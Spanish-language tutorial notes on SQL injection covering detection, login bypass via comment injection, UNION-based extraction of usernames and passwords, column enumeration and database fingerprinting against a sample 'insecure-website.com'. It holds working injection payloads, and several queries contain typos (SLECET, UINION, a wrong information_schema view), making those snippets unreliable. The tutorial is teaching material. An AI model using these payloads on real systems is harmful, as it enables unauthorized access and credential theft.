# ¿Que es?
La *Inyección SQL (SQLi)* es una vulnerabilidad de seguridad web que permite a un atacante interferir en las consultas que realiza una aplicación a la base de datos. Permitiendo a un atacante obtener datos que pertenecen a otros usuarios, o datos a los cuales solo la aplicación puede acceder. El atacante puede modificar, consultar e incluso eliminar estos datos causando cambios persistentes en el contenido o comportamiento de la aplicación.

Estos ataques pueden permitir también al atacante escalarlo llegando a poder comprometer un servidor subyacente u otra infraestructura de back-end.

# ¿Cómo detectarla?
Para detectar esta vulnerabilidad es necesario encadenar o usar un conjunto sistemático de pruebas contra cada punto de entrada en la aplicación, normalmente suelen ser las siguiente pruebas:
- Inclusión en entradas del carácter `'` y buscar anomalías o errores
- Algunas sintaxis especificas de *SQL* que evalué el valor original del punto de entrada y a un valor diferente, buscando diferencias sistemáticas en las respuestas de la aplicación
- Condiciones booleanas como `OR 1=1` y `OR 1=2` y buscar diferencias en las respuestas de una aplicación
- Payloads  diseñados para desencadenar retrasos de tiempo cuando se ejecutan dentro de una consulta *SQL*  y buscar diferencias de tiempos en las respuestas
- Payloads *OAST  (Out-of-Band Application Security Testing)* diseñadas para desencadenar una interacción de red fuera de banda cuando se ejecuta dentro de una consulta *SQL* y monitorear cualquier interacción resultante

# Inyección SQL en diferentes partes de la consulta
La mayoría de las inyecciones ocurren en las consultas `SELECT` en el campo `WHERE`, esta suele ser la mas común, pero también se pueden acontecer en cualquier otra ubicación, como por ejemplo en las declaraciones:
- `UPDATE` dentro de los valores actualizados o en la clausula `WHERE
- `INSERT` dentro de los valores insertados
- `SELECT` dentro de la tabla o el nombre de la columna
- `SELECT` dentro de la clausula `ORDER BY`

# Ejemplos de inyecciones SQL
Hay infinidad de vulnerabilidad, ataques y técnicas de inyección SQL que ocurren en diferentes situaciones, algunos ejemplos comunes pueden ser:




## Recuperar de datos ocultos
Este ataque es donde se puede modificar una consulta *SQL* para devolver resultados adicionales.

Imagina en una aplicación de compra que muestra productos en diferentes categorías, cuando el usuario haga clic en *Categorías* -> *Regalos* su navegador solicitara
```sql
https://insecure-website.com/products?category=Gifts
```

Esto hace que la aplicación realice una consulta *SQL* para recuperar los detalles de los productos relevantes de la base de datos
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Esta consulta pide a la base de datos que devuelta
- Todos los detalles *`*`*
- Desde la tabla de *`products`*
- Donde *`category`* sea *`Gifts`*
- Y *`released`* sea *`1`*

La ultima restricción `released = 1` se esta usando para ocultar productos que no se han lanzado todavía, podríamos asumir que estos productos ocultos se encuentran en `released = 0`

La aplicación no implementa ningún sistema de defensa contra ataques de *Inyección SQL*. Por lo cual un atacante podría construir el siguiente ataque:

```sql
https://insecure-website.com/products?category=Gifts'--
```

Esto se traduce a la consulta *SQL*
```sql
SLECET * FROM products WHERE category = 'Gifts'--' AND released = 1
```

En esta consulta se incluyen los caracteres de comentario en *SQL* `--` al incluirlos en la consulta detrás de una `'` la consulta interpreta que se cierra la sentencia al finalizar en `Gifts` y todo lo que se acontece a continuación se basa en un comentario haciendo que no se incluya `AND released = 1`, Como resultado se obtendrían tanto los productos lanzados como los no lanzados.

También se puede ejecutar de cierta forma en la que se puede hacer que la aplicación muestre todos los productos de cualquier categoría incluyendo categorías de las que no se tiene conocimiento

```sql
https://insecure-website.co,/products?category=Gifts'+OR+1=1--
```

El símbolo `+` se usa para concatenar o sustituir al espacio corriente
Siendo esto una consulta *SQL*
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

Esta consulta modificada devuelve todos los artículos que su `category` es `Gifts` o que `1` sea igual a `1` como esta consulta siempre es cierta y siempre se cumple devuelve todos los elementos.

## Evadir la lógica de la aplicación
En los casos en la que la aplicación permite a los usuarios iniciar sesión con nombre de usuario y contraseña el usuario envía las credenciales por ejemplo `wiener` como usuario y de contraseña `bluecheese`, si al consulta es afirmativa entonces el inicio de sesión es exitoso, de lo contrario se rechaza.

En este caso un usuario puede iniciar sesión como cualquier usuario sin la necesidad de una contraseña. Se puede realizar usando usando una secuencia de comentarios SQL `--` para eliminar la comprobación de contraseña en la cláusula `WHERE` 

Por ejemplo queremos acceder como `administrator` y la consulta es:
```sql
SELECT * FROM users WHERE username = '' AND password = ''
```

Como atacante deberemos de omitir la validación de la contraseña introduciendo los siguientes parámetro en el campo de login
```sql
administrator'--
```

Lo que transformaría la consulta en el siguiente campo, permitiéndonos acceder como usuario administrador
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```


## Recuperar datos de otras tablas
En los casos en los que un atacante puede recuperar los resultados de la consulta SQL este mismo atacante puede usar esto para recuperar datos de otras tablas dentro de la base de datos.
Pudiendo usar la sentencia `UNION` con la consulta `SELECT`.

Por ejemplo si una aplicación ejecuta la siguiente consulta con la entrada por parte del usuario del filtro `Gifts`
```sql
SELECT name, description FROM products WHere category = 'Gifts'
```

Un atacante se puede aprovechar de ellos usando `UNION SELECT`
```sql
' UINION SELECT username, password FROM users --
```
 
 Esto nos permite obtener todos los nombres de usuario y contraseñas junto con las descripciones de los productos

## Inyección SQL ciega

 Muchas de las vulnerabilidades que se acontecen en SQL son vulnerabilidades ciegas, lo que significa que la aplicación no devuelve los resultados de la consulta SQL o los detalles de cualquier error de la base de datos dentro de sus respuestas.
## Inyección SQL de segundo orden (Almacenada)
La inyección SQL de primer orden se genera cuando la aplicación procesa una entrada por parte del usuario a partir de una solicitud HTTP e incorpora la entrada en una consulta de manera insegura.

La inyección de segundo orden se produce cuando la aplicación toma la entrada del ususario de una solicitud HTTP y la almacena para su futuro uso. Generalmente esto se produce colocando la entrada en la base de datos, pero no se produce ninguna vulnerabilidad en el punto donde se almacenan los datos. Posteriormente al manejar una solicitud HTTP diferente, la aplicación recupera los datos almacenados y los incorpora en una consulta SQL de manera insegura, esta inyección también se conoce como inyección SQL almacenada.

# Examinar la base de datos
Es necesario una vez identificada la vulnerabilidad de inyección SQL saber sobre que tipo de base de datos estamos trabajando ya que en cada una las consultas pueden ser diferentes entre si.

## Consultar el tipo y la versión de la base de datos

| Tipo       | Consulta                   |
| ---------- | -------------------------- |
| MSQL       | `SELECT @@version`         |
| MySQL      | `SELECT @@version`         |
| Oracle     | `SELECET * FROM v$version` |
| PostgreSQL | `SELECT version()`         |

Por ejemplo si queremos consultar la versión podemos usar `UNION`
```sql
' UNION SELECT <consulta>--
```

Con ello podríamos confirmar de que tipo de base de datos estamos tratando

## Listar el contenido de la base de datos non-Oracle
La mayoría de las bases de datos menos *(Oracle)* tienen un conjunto de vistas llamadas *information schema* la cual proporciona información sobre la base de datos.
Por ejemplo si queremos enumerar las tablas de la base de datos podemos usar
```sql
SELECT * FROM information_schema.tables
```

Devolviéndonos las tablas que hay dentro de la base de datos
Entonces ahora conociendo las tablas podemos enumerar las columnas
```sql
SELECT * FROM information_schema.tables WHERE table_name = '<nombreTabla'
```

Devolviéndonos las columnas de la tabla especificada y el tipo de dato en cada columna

## Listar el contenido de una base de datos Oracle
Para listar el contenido de una base de datos Oracle se utiliza la consulta `all_tables` para enumerar las tablas
```sql
SELECT * FROM all_tables
```

Y `all_tab_columns` para enumerar las columnas
```sql
SELECT * FROM all_tab_columns WHERE table_name = '<nombreTabla>'
```

# Inyección SQL UNION
Cuando se acontece una vulnerabilidad SQL en una aplicación web se puede usar la clausula `UNION` para recuperar datos de otras tablas dentro de la base de datos.

Al usar `UNION` se nos permite ejecutar una o mas consultas `SELECT` adicionales y añadir los resultados a la consulta original.
```sql
SELECT a, b FROm table1 UNION SELECT c, d FROM table2
```

Esta consulta devuelve un único conjunto de resultados en dos columnas que contiene los valores de las columnas `a` y `b` de la `table1` y los valores `c` y `d` de la `table2`

Para poder trabajar con una consulta `UNION` se deben de cumplir dos requisitos clave
- Las consultas individuales deben devolver el mismo numero de columnas
- Los tipos de datos en cada columna debe ser compatibles entre las columnas individuales

Para llevar a cabo un ataque de este estilo se tienen que resolver las siguientes cuestiones
- ¿Cuántas columnas se devuelven de la columna original?
- Que columnas devueltas de la consulta original 

## Determinar el numero de columnas
Cuando se realiza un ataque SQL hay dos métodos para determinar el numero de columnas que se devuelven en la consulta original.

Una de las técnicas es el uso de la clausula `ORDER BY` e ir incrementando el índice de la columna hasta que se produzca un error. Por ejemplo si el punto de inyección se encuentra en la clausula `WHERE` original se usaría de la siguiente forma
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Este payload de lo que se encarga es de modificar la consulta original para ordenar los resultados por diferentes consultas. Cuando se excede del numero de columnas la base de datos devolverá un error, en caso de que no se devuelva el error cualquier cambio o variación en la respuesta pude inferir en cuantas columnas tiene la base de datos.

La otra técnica que se usa consiste en usar una seria de `UNION SELECT` con valores vacías hasta que se devuelva el error o cualquier cambio o variación en la respuesta de la petición
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL, NULL--
```

Se usa `NULL` y no caracteres ya que el tipo de dato `NULL` es compatible con todos los datos originales de  ya que este es convertible a cualquier tipo de dato común lo cual maximiza las capacidades de éxito en el recuento de columnas.

## Enumerar columnas con un tipo de dato útil
Los datos mas interesantes que se buscan recuperar a la hora de realizar una inyección *SQL* son las cadenas de texto, por lo cual deberemos de determinar primero el numero de columnas que se encuentran y luego sondear columna a columna cual de ella contiene texto.
Por ejemplo su sabemos que estamos ante 4 columnas usaremos un payload semejante a este
```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

SI el tipo de datos inyectado en la columna no es compatible recibiremos un error, en caso de no recibir un error y la respuesta contiene algún contenido adicional que incluya el valor de la cadena inyectada, entonces la columna identificada es relevante para recuperar datos de ella.

## Recuperar datos de otras tablas
Una vez tenemos identificado el numero de columnas devueltas y hemos localizado las columnas que pueden contener datos de cadena esta en condiciones para recuperar datos interesantes.
Supongamos que la consulta original devuelve dos columnas, ambas de las cuales pueden contener datos. El punto de inyección es una cadena citada dentro de la clausula `WHERE`. La base de datos contiene una tabla llamada `users` mediante la entrada
```sql
' UNION SELECT username, password FROM users--
```

Para llevar a cabo este ataque es necesario conocer que hay una tabla llamada `users` con dos columnas identificadas como `username` y `password`. Sin esta información habría que adivinar los nombres de las tablas y columnas, todas las bases de datos moderna proporcionan diversas formas para examinar la estructura de la base de datos y determinar que tablas y columnas contienen

## Recuperación de múltiples valores dentro de una sola columna
En algunos casos puede ser que las consultas de cadena de texto solo puedan ser mostradas en una sola columna. Se mostrarían los valores juntos y se pueden añadir separadores para facilitar la lectura de estos datos extraídos.
Por ejemplo en una base de datos de Oracle se puede usar
```sql
' UNION SELECT username || '~' || password FROM users--
```

# Inyección SQL ciega
Una vulnerabilidad de inyección SQL ciega *blind* se acontece cuando la aplicación es vulnerable a *inyección SQL* pero la aplicación no muestra información ni varia el contenido de las respuestas `HTTP`.

Muchas técnicas como los ataques `UNION` no son efectivos en este tipo de vulnerabilidades.
